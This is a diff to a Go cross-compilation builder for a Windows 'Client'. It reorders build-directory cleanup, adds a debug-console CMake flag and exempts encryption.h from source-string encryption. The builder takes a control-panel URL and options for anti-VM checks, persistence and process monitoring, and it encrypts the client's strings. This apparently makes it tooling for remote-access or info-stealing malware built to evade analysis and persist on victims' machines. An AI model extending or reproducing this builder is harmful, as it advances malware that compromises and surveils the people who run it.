@@ -14,15 +14,6 @@ import (
 
 // Linux builder - cross-compiles for Windows using MinGW on Linux
 
-func init() {
-	if runtime.GOOS != "linux" {
-		logError("This builder only works on Linux. Use build.sh instead.")
-		os.Exit(1)
-	}
-	clientDir = "./Client"
-	buildDir = filepath.Join(clientDir, "build")
-}
-
 // checkDependencies verifies MinGW and build tools are installed
 func checkDependencies() error {
 	logInfo("Checking dependencies...")
@@ -129,6 +120,15 @@ func buildClientLinux() error {
 
 // executeBuild performs the actual build process
 func executeBuild(panelURL string, processMonitoring, debugConsole, antiVM, persistence bool) error {
+	// Clean build directory first to ensure no stale CMake cache or files
+	logInfo("Cleaning build directory: %s", buildDir)
+	if err := os.RemoveAll(buildDir); err != nil {
+		logError("Warning: Failed to remove build directory: %v", err)
+	}
+	if err := os.MkdirAll(buildDir, 0755); err != nil {
+		return fmt.Errorf("failed to create build directory: %v", err)
+	}
+
 	// Backup source files
 	backupDir := filepath.Join(clientDir, "backup")
 	logInfo("Backing up source files to %s", backupDir)
@@ -189,13 +189,9 @@ func executeBuild(panelURL string, processMonitoring, debugConsole, antiVM, pers
 		return fmt.Errorf("failed to toggle WIN32 flag: %v", err)
 	}
 
-	// Clean build directory
-	os.RemoveAll(buildDir)
-	os.MkdirAll(buildDir, 0755)
-
 	// Run CMake
 	logInfo("Configuring project with CMake...")
-	if err := runCMakeLinux(antiVM, persistence); err != nil {
+	if err := runCMakeLinux(antiVM, persistence, debugConsole); err != nil {
 		return fmt.Errorf("CMake configuration failed: %v", err)
 	}
 
@@ -230,7 +226,7 @@ func executeBuild(panelURL string, processMonitoring, debugConsole, antiVM, pers
 }
 
 // runCMakeLinux runs CMake for Linux cross-compilation
-func runCMakeLinux(antiVM bool, persistence bool) error {
+func runCMakeLinux(antiVM bool, persistence bool, debugConsole bool) error {
 	args := []string{
 		"-DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc",
 		"-DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++",
@@ -244,6 +240,10 @@ func runCMakeLinux(antiVM bool, persistence bool) error {
 
 	if persistence {
 		args = append(args, "-DENABLE_PERSISTENCE=ON")
+	}
+
+	if debugConsole {
+		args = append(args, "-DENABLE_DEBUG_CONSOLE=ON")
 	}
 
 	args = append(args, "..")
@@ -407,6 +407,10 @@ func encryptSourceStrings(keyBytes []byte) error {
 		}
 
 		name := entry.Name()
+		// Skip encryption.h as it contains decryption logic
+		if name == "encryption.h" {
+			continue
+		}
 		if !strings.HasSuffix(name, ".cpp") && !strings.HasSuffix(name, ".h") {
 			continue
 		}
